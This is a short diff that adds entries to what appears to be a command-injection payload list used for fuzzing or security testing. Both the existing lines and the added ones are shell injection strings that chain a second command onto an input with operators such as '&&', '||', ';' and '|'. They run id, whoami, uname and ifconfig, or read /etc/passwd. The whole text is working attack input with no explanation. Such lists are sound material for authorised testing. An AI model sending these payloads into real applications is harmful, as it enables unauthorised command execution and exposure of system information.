@@ -38,3 +38,11 @@ $(cat /etc/passwd)
 \nwhoami
 ;id;
 |id|
+&& id
+&& whoami
+&& cat /etc/passwd
+&& uname -a
+&& ifconfig
+|| id
+|| whoami
+|| cat /etc/passwd
